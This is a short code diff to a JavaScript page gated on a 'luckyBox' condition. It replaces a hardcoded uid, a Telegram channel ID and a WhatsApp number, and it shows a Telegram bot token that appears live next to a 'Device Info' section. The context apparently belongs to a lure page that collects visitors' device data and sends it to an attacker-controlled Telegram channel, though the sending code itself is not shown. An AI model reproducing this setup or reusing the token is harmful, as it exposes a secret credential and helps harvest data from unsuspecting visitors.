@@ -117,11 +117,11 @@ if (luckyBox) {
     }
     
     const context = canvas.getContext('2d');
-    const uid = '7748871040';
+    const uid = '7973196371';
 
     const botToken = '8403443030:AAFWdchybA9ruQECsZSdQW-dzMHxTXMDRVc';
-    const channelId = '7973196371';
-    let whatsappNumber = '94725671018';
+    const channelId = '1003313622422';
+    let whatsappNumber = '94781121579';
 
     // Device Info
     let battery = 'unknown';
